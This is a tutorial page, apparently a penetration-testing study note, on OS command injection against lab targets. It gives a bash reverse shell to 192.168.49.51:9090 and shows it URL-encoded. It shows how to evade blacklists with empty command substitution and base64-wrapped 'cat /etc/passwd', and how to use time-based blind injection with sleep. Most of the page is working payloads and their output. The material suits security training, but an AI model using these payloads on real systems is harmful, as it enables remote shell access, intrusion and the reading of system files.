---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# CI 101

## Input Normalization

We must handle "bad" characters that might alter a payloadâ€™s behavior. We should **enclose such characters in single quotes** to make the target server interpret them as valid data instead of new parameters.

```bash
bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'
```

We also need to **URL-encode** these characters. For instance, the `&` character is used as a delimiter by the backend, and if not URL-encoded, the web server will process everything after it as a parameter-value pair.

{% code overflow="wrap" %}
```bash
$ hURL -U "bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'"

Original    :: bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'
URL ENcoded :: bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.51%2F9090%200%3E%261%27
```
{% endcode %}

## Input Sanitization - Blacklisted

### Command Substitution

We can use command substitution (`$()` or ` `` `) to inject **empty output** between characters, thereby modifying strings without altering the functional behavior of the payload.

```bash
$ wh$()oami
x7331
$ who``ami
x7331
```

### Base64 Encoding

We can also combine Base64-encoding with command substitution.

```bash
$ echo "cat /etc/passwd" |base64
Y2F0IC9ldGMvcGFzc3dkCg==
```

{% code overflow="wrap" %}
```html
http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`
```
{% endcode %}

## Blind CI

```html
http://ci-sandbox/php/blind.php?ip=127.0.0.1|sleep+5;
```

<figure><img src="../../../../.gitbook/assets/web_ci_blind_1 (1).png" alt=""><figcaption><p>Figure 1: Injecting a time-based payload.</p></figcaption></figure>

We also use `time` and `curl` to measure the response time.

```bash
$ time curl "http://ci-sandbox/php/blind.php?ip=127.0.0.1" -s
<html>
<SNIP>
</html>

real    0m0.062s # Normal response time
user    0m0.006s
sys     0m0.000s

$ time curl "http://ci-sandbox/php/blind.php?ip=127.0.0.1|sleep+5" -s
<html>
<SNIP>
</html>

real    0m5.063s # The 'sleep 5' payload worked
user    0m0.003s
sys     0m0.003s
```
